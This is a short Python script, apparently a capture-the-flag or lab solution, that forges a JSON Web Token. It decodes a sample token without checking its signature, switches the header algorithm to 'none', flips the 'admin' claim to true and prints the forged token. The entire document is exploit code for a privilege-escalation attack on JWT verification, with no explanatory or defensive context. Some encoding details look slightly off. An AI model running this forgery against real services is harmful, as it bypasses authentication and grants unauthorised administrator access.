token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImhlbGxvIiwiYWRtaW4iOmZhbHNlfQ.R13Xbt20dUWlhdkY-GSNUHZecV5p9IZpTVWZClX-AE8"

import jwt
import base64
import json

header = jwt.get_unverified_header(token)
header['alg'] = 'none'
body = jwt.decode(token, options={"verify_signature": False})
body['admin'] = True

print(header)
print(body)

fake_token_parts = jwt.encode(body, b'', algorithm='HS256').split('.')
header_str = json.dumps(header).encode('utf-8')
fake_token_parts[0] = base64.urlsafe_b64encode(header_str)

print(
    fake_token_parts[0].decode() + '.' +
    fake_token_parts[1] + '.' +
    fake_token_parts[2]
)
